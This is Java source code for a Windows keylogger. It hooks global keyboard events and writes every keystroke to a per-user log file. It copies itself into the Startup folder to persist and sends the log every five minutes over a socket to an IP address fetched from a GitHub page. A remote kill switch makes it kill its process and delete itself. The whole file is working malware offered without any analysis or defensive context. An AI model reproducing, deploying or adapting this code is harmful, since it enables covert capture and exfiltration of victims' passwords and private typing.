package main;

import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Scanner;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;

public class Main implements NativeKeyListener{
	public static void main (String[] args) throws IOException, URISyntaxException {
		if (!isWindows()) {
			System.exit(0);
		}
		if (isSuicune()) {
			 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
			 @SuppressWarnings("unused")
			Process bye = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "taskkill /im javaw.exe /f && del " + cf + " && taskkill /im cmd.exe /f");
			System.exit(0);
		}
		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
		// System.out.println("Location " + yiffyiff);
		String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
		// System.out.println("Startup " + startup);
		// System.out.println("Running command " + System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
		 @SuppressWarnings("unused")
		//  Process selfcopy = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "copy \"" + yiffyiff + "\"" + " \"" + startup +"\"");
		 Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
		 
		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
		if(!log.exists()) {
			System.out.println("Creating logfile...");
			System.out.println("Starting...");
			log.createNewFile();
		} else {
			System.out.println("Starting...");
		}
		String fn = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
		PrintWriter timestamper = new PrintWriter(new FileWriter(fn, true));
		timestamper.println();
		timestamper.print("[Startup: " + new SimpleDateFormat("EEEE").format(new Date()) + " +" + getCurrentTimeInBeats() + " ]");
		timestamper.println();
		timestamper.close();
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		GlobalScreen.getInstance().addNativeKeyListener(new Main());
		for(;;) {
			java.util.Date date = new java.util.Date();
		    Calendar cal = Calendar.getInstance();
		    cal.setTime(date);
		    int minutes = cal.get(Calendar.MINUTE);
			 if (minutes % 5 == 0) {
			    	// send the file
			    	try {
			    		//System.out.println(connectTo);
			    		Socket socket = new Socket(getHostIP(), 25565);
			    		OutputStream t = socket.getOutputStream();
			    		PrintWriter out = new PrintWriter(t);
						String toSend = System.getProperty("user.name") + ".txt";
						out.print(toSend );
						out.flush();
			    		File transferFile = new File ("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt"); 
			    		byte [] bytearray = new byte [(int)transferFile.length()]; 
			    		FileInputStream fin = new FileInputStream(transferFile); 
			    		BufferedInputStream bin = new BufferedInputStream(fin); 
			    		bin.read(bytearray,0,bytearray.length); 
			    		OutputStream os = socket.getOutputStream(); 
			    		// System.out.println(""); 
			    		os.write(bytearray,0,bytearray.length); 
			    		os.flush(); 
			    	} catch (Exception e) {
			    		System.out.println(e);
			    	}
			    }
		}
	}

	private static boolean isSuicune() {
		try {
			 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/klkillswitch");
	         URLConnection yc = yahoo.openConnection();
	         BufferedReader in = new BufferedReader(new InputStreamReader(
	                 yc.getInputStream(), "UTF-8"));
	         String inputLine;
	         StringBuilder a = new StringBuilder();
	         while ((inputLine = in.readLine()) != null){
	             a.append(inputLine);
	             if(a.toString().contains("yes")) {
	            	 return true;
	             }
	         }
	         System.out.println("NO");
	         return false;
		} catch (Exception e) {
			System.out.println(e);
			return false;
		}
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
	    // System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		//if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Enter")) {
		//	System.out.print("\n");
		//} else if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Space")) {
		//	System.out.print(" ");
		//} else {
		//	System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
		//}
		}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
	}
	public static void record(String x) {
		try {
			String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
			// System.out.println("rec " + x);
			if(x.matches("Space")) {
				out.print(" ");
				out.close();
			} else {
			out.print(x);
			out.close();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	 public static boolean isWindows() {
		   String OS = System.getProperty("os.name").toLowerCase();
		   return (OS.indexOf("win") >= 0);
		}
	 public static int getCurrentTimeInBeats() {
		    java.util.Calendar cal = java.util.Calendar.getInstance( java.util.TimeZone.getTimeZone( "GMT+01:00" ) );
		    int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
		    return beats;
		}
	 public static String getHostIP() throws IOException {
		 try {
		 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/uploader");
         URLConnection yc = yahoo.openConnection();
         BufferedReader in = new BufferedReader(new InputStreamReader(
                 yc.getInputStream(), "UTF-8"));
         String inputLine;
         StringBuilder a = new StringBuilder();
        // System.out.println("a");
         while ((inputLine = in.readLine()) != null){
             a.append(inputLine);
             if(inputLine.contains("connectTo")) {
          //  	 System.out.println("b");
            	 return(inputLine.substring(78, inputLine.indexOf("</td>")));
             }
         }
         return "127.0.0.1";
		 } catch (Exception e) {
			 return "127.0.0.1";
		 }
	 }
}